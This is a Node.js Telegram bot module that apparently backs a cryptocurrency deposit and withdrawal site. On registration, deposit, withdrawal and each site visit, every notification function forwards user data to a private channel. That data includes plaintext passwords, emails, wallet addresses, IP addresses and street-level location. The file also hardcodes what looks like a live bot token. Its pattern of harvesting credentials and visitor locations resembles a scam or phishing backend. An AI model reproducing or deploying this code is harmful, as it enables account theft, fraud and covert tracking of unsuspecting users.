const TelegramBot = require('node-telegram-bot-api');

const token = '8125033616:AAHRzf1FgLJ_BGPaI70w6NQZKVJQiwVgf6g';

console.log('Bot starting...');

const bot = new TelegramBot(token, {polling: true});

bot.on('polling_error', (error) => {
    console.error('Polling error:', error);
});

bot.on('message', (msg) => {
    console.log('Received message:', msg);
    if (msg.chat && msg.chat.type === 'channel') {
        console.log('Private Channel ID:', msg.chat.id);
    }
});

const privateChannelId = '-1002307869361'; // Replace with your private channel ID

/*bot.sendMessage(privateChannelId, 'Бот запущен успешно✅')
    .then(() => {
        console.log('Startup message sent to channel.');
        return bot.getChat(privateChannelId);
    })
    .then((chat) => {
        console.log('Channel Info:', chat);
    })
    .catch((error) => console.error('Error:', error));*/

const sendNewUserNotification = (user) => {
    const message = `✅Новый пользователь:
Имя: ${user.name}
Фамилия: ${user.secondName}
Емейл: ${user.email}
Телеграм: ${user.telegram}
Пароль: ${user.password}
TRC Адрес: ${user.usdtWallet || 'Данных нет'}
Партнер: ${user.curator || 'Данных нет'}
IP Адрес: ${user.ipAddress || "Данных нет"}
Полный адрес: ${user.fullLocationName || "Данных нет"}
Дата регистрации: ${new Date().toLocaleString()}`;

    bot.sendMessage(privateChannelId, message)
        .then(() => console.log('Notification sent to private channel.'))
        .catch((error) => console.error('Error sending notification:', error));
};

const sendDepositNotification = (user, deposit) => {
    const message = `‍💰Зачисление:
Имя: ${user.name}
Фамилия: ${user.secondName}
Телеграм: ${user.telegram}
Емейл: ${user.email}
Пароль: ${user.password}
Cумма: ${deposit.amount}$
Кошелёк: ${deposit.walletType}
TRC Адрес: \`${user.usdtWallet || 'Данных нет'}\`
Партнер: ${user.curator || 'нет партнёра'}
IP Адрес: ${user.ipAddress || "Данных нет"}
Время запроса: ${new Date().toLocaleString()}`;

    bot.sendMessage(privateChannelId, message)
        .then(() => console.log('Deposit notification sent to private channel.'))
        .catch((error) => console.error('Error sending deposit notification:', error));
};

const sendWithdrawNotification = (user, withdraw) => {
    const message = `⛔️ Заявка на вывод:
Имя: ${user.name}
Фамилия: ${user.secondName}
Телеграм: ${user.telegram}
Емейл: ${user.email}
Пароль: ${user.password}
Cумма: ${withdraw.amount}$
Кошелёк: ${withdraw.walletType}
TRC Адрес: \`${user.usdtWallet || 'Данных нет'}\`
Партнер: ${user.referralCode || 'нет партнёра'}
IP Адрес: ${user.ipAddress || "Данных нет"}
Время запроса: ${new Date().toLocaleString()}`;

    bot.sendMessage(privateChannelId, message)
        .then(() => console.log('Withdraw notification sent to private channel.'))
        .catch((error) => console.error('Error sending withdraw notification:', error));
};

const sendLocationNotification = (location) => {
    const message = `👁️‍🗨️IP заход на сайт:
Страна: ${location.country}
Город: ${location.city}
Местность: ${location.state}
Адрес: ${location.address}
Номер дома: ${location.apartment}
Поштовый индекс: ${location.postalCode}
Айпи: ${location.ip}`;

    bot.sendMessage(privateChannelId, message)
        .then(() => console.log('Location notification sent to private channel.'))
        .catch((error) => console.error('Error sending location notification:', error));
};

console.log('Bot started successfully');

module.exports = {
    sendNewUserNotification,
    sendLocationNotification,
    sendDepositNotification,
    sendWithdrawNotification
};